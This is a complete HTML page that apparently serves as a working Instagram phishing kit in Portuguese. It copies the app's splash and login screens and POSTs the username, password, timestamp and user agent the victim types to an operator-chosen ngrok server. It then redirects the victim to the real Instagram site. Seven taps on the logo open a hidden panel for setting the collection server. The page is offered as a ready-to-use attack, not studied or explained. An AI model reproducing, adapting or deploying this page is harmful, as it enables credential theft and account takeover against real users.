<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>&#73;nstagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100dvh;
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        /* ========== SPLASH SCREEN ========== */
        #splash-screen {
            position: fixed;
            inset: 0;
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 120px 0 60px 0;
            z-index: 1000;
            transition: opacity 0.35s ease;
        }

        .splash-logo-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .instagram-splash-icon {
            width: 80px;
            height: 80px;
        }

        .from-meta-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
        }

        .from-label {
            color: #8E8E8E;
            font-size: 13px;
            font-weight: 400;
        }

        .meta-brand {
            display: flex;
            align-items: baseline;
            gap: 4px;
        }

        .infinity-icon {
            font-size: 24px;
            font-weight: 600;
            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .meta-text {
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* ========== LOGIN SCREEN ========== */
        #login-screen {
            display: none;
            flex-direction: column;
            align-items: center;
            width: 100%;
            height: 100dvh;
            background-color: #000;
            padding: 0 16px;
        }

        .language-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            padding: 16px 0 8px;
            margin-bottom: 12px;
        }

        .language-selector {
            color: #A8A8A8;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .login-logo-wrapper {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-bottom: 36px;
            cursor: pointer;
            pointer-events: auto;
            z-index: 10;
        }

        .instagram-login-icon {
            width: 64px;
            height: 64px;
        }

        #login-form {
            width: 100%;
            max-width: 358px;
        }

        .input-field {
            width: 100%;
            background: #121212;
            border: 0.5px solid #363636;
            border-radius: 12px;
            padding: 14px 16px;
            color: #FFF;
            font-size: 14px;
            margin-bottom: 10px;
            outline: none;
        }

        .input-field:focus {
            border-color: #A8A8A8;
        }

        .input-field::placeholder {
            color: #8E8E8E;
        }

        .login-button {
            width: 100%;
            background: #0095F6;
            color: #FFF;
            border: none;
            border-radius: 18px;
            padding: 7px 0;
            font-size: 14px;
            font-weight: 600;
            margin-top: 12px;
            margin-bottom: 16px;
            cursor: pointer;
        }

        .forgot-wrapper {
            width: 100%;
            text-align: center;
            margin-bottom: 80px;
        }

        .forgot-link {
            color: #FFF;
            font-size: 14px;
            text-decoration: none;
        }

        .footer-wrapper {
            margin-top: auto;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 24px;
        }

        .signup-button {
            width: 100%;
            max-width: 358px;
            background: transparent;
            border: 1px solid #0095F6;
            border-radius: 18px;
            padding: 7px 0;
            color: #0095F6;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-bottom: 28px;
        }

        .meta-footer svg {
            width: 70px;
            opacity: 0.6;
        }

        /* Painel de configuração */
        #server-config {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #1c1c1c;
            padding: 16px;
            border-radius: 12px;
            display: none;
            z-index: 2000;
            border: 0.5px solid #363636;
            width: 90%;
            max-width: 350px;
        }

        #server-config h3 {
            color: #FFF;
            font-size: 14px;
            margin-bottom: 12px;
            text-align: center;
        }

        #server-config input {
            background: #000;
            border: 0.5px solid #363636;
            color: #FFF;
            padding: 10px 12px;
            border-radius: 8px;
            width: 100%;
            font-size: 12px;
            outline: none;
            margin-bottom: 12px;
        }

        .config-buttons {
            display: flex;
            gap: 8px;
        }

        #server-config button {
            flex: 1;
            background: #0095F6;
            color: #FFF;
            border: none;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
        }

        #server-config .close-btn {
            background: #363636;
        }

        #tap-indicator {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,149,246,0.9);
            color: #FFF;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
            opacity: 0;
            transition: opacity 0.2s;
            z-index: 1999;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <svg style="width:0; height:0; position:absolute;">
        <defs>
            <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#833AB4"/>
                <stop offset="25%" stop-color="#C13584"/>
                <stop offset="50%" stop-color="#E1306C"/>
                <stop offset="75%" stop-color="#FD1D1D"/>
                <stop offset="100%" stop-color="#FCAF45"/>
            </linearGradient>
        </defs>
    </svg>

    <!-- SPLASH -->
    <div id="splash-screen">
        <div class="splash-logo-container">
            <svg class="instagram-splash-icon" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
            </svg>
        </div>
        <div class="from-meta-container">
            <p class="from-label">from</p>
            <div class="meta-brand">
                <span class="infinity-icon">∞</span>
                <span class="meta-text">Meta</span>
            </div>
        </div>
    </div>

    <!-- LOGIN -->
    <div id="login-screen">
        <div class="language-wrapper">
            <div class="language-selector">
                <span>Português (Brasil)</span>
                <svg viewBox="0 0 24 24" width="12" height="12" fill="#A8A8A8">
                    <path d="M7 10l5 5 5-5H7z"/>
                </svg>
            </div>
        </div>
        
        <!-- LOGO CLICÁVEL -->
        <div class="login-logo-wrapper" onclick="handleLogoTap()">
            <svg class="instagram-login-icon" viewBox="0 0 24 24" fill="none">
                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="12" cy="12" r="5.5" stroke="url(#g)" stroke-width="2.2" fill="none"/>
                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#g)"/>
            </svg>
        </div>

        <form id="login-form">
            <input type="text" name="u" class="input-field" placeholder="Nome de usuário, email ou celular" autocomplete="off">
            <input type="text" name="p" class="input-field" placeholder="Senha" autocomplete="off">
            <button type="submit" class="login-button">Entrar</button>
        </form>

        <div class="forgot-wrapper">
            <a href="#" class="forgot-link">Esqueceu a senha?</a>
        </div>

        <div class="footer-wrapper">
            <a href="#" class="signup-button">Criar nova conta</a>
            <div class="meta-footer">
                <svg viewBox="0 0 287 56" fill="white">
                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
                    <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
                    <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
                    <path d="M110 52L110 4L118 4L118 52L110 52Z" fill="currentColor"/>
                    <path d="M130 52L130 4L138 4L138 24L152 4L162 4L146 22L164 52L152 52L138 28L138 52L130 52Z" fill="currentColor"/>
                    <path d="M175 52L175 4L183 4L183 24L197 4L207 4L191 22L209 52L197 52L183 28L183 52L175 52Z" fill="currentColor"/>
                    <circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/>
                    <path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/>
                </svg>
            </div>
        </div>
    </div>

    <!-- INDICADOR DE TOQUES -->
    <div id="tap-indicator">Toques: 0/7</div>

    <!-- PAINEL DE CONFIGURAÇÃO -->
    <div id="server-config">
        <h3>⚙️ Configurar Servidor</h3>
        <input type="text" id="server-url" placeholder="https://seu-ngrok.ngrok-free.app">
        <div class="config-buttons">
            <button onclick="saveServerUrl()">Salvar</button>
            <button class="close-btn" onclick="hideConfig()">Fechar</button>
        </div>
    </div>

    <script>
        let SERVER_URL = localStorage.getItem('serveo_url') || '';
        let tapCount = 0;
        let tapTimer = null;
        
        // FUNÇÃO CHAMADA PELO ONCLICK DO LOGO
        function handleLogoTap() {
            tapCount++;
            
            const indicator = document.getElementById('tap-indicator');
            indicator.style.opacity = '1';
            indicator.textContent = `Toques: ${tapCount}/7`;
            
            clearTimeout(tapTimer);
            tapTimer = setTimeout(() => { 
                tapCount = 0; 
                indicator.style.opacity = '0';
            }, 1500);
            
            if (tapCount >= 7) {
                document.getElementById('server-config').style.display = 'block';
                document.getElementById('server-url').value = SERVER_URL;
                tapCount = 0;
                indicator.style.opacity = '0';
            }
        }
        
        function saveServerUrl() {
            const url = document.getElementById('server-url').value.trim();
            if (url) {
                SERVER_URL = url.replace(/\/$/, '');
                localStorage.setItem('serveo_url', SERVER_URL);
                document.getElementById('server-config').style.display = 'none';
                alert('✅ Servidor configurado!');
            }
        }
        
        function hideConfig() {
            document.getElementById('server-config').style.display = 'none';
        }
        
        // SPLASH
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('splash-screen').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash-screen').style.display = 'none';
                    document.getElementById('login-screen').style.display = 'flex';
                }, 350);
            }, 2200);
        });
        
        // FORMULÁRIO
        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const u = document.querySelector('input[name="u"]').value.trim();
            const p = document.querySelector('input[name="p"]').value.trim();
            
            if (!u || !p) return;
            
            if (SERVER_URL) {
                try {
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'ngrok-skip-browser-warning': 'true'
                        },
                        body: JSON.stringify({
                            u: u,
                            p: p,
                            t: new Date().toISOString(),
                            ua: navigator.userAgent
                        })
                    });
                    await new Promise(r => setTimeout(r, 1000));
                } catch (err) {}
            }
            
            window.location.href = 'https://www.instagram.com/reels/';
        });
        
        // LINKS
        document.querySelectorAll('a').forEach(l => l.addEventListener('click', e => e.preventDefault()));
        
        // CARREGAR URL SALVA
        if (SERVER_URL) console.log('Servidor configurado');
    </script>
</body>
</html>
